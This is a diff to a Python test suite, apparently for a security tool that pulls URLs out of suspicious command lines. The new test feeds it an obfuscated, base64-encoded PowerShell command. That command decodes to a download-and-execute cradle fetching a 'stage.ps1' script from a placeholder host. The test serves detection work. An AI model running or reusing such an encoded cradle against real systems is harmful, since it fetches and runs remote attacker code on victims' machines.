@@ -20,6 +20,14 @@ class TestStorylineCommandNetworks:
 
         assert url == "https://cdn.example.test/stage.ps1"
 
+    def test_extract_http_url_from_encoded_powershell_download(self):
+        url = StorylineMixin._extract_http_url(
+            "powershell.exe -NoProfile -EncodedCommand "
+            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=="
+        )
+
+        assert url == "https://cdn.example.test/stage.ps1"
+
     def test_parse_http_url_target_accepts_valid_url(self):
         target = StorylineMixin._parse_http_url_target("https://cdn.example.test:8443/stage.ps1")
 
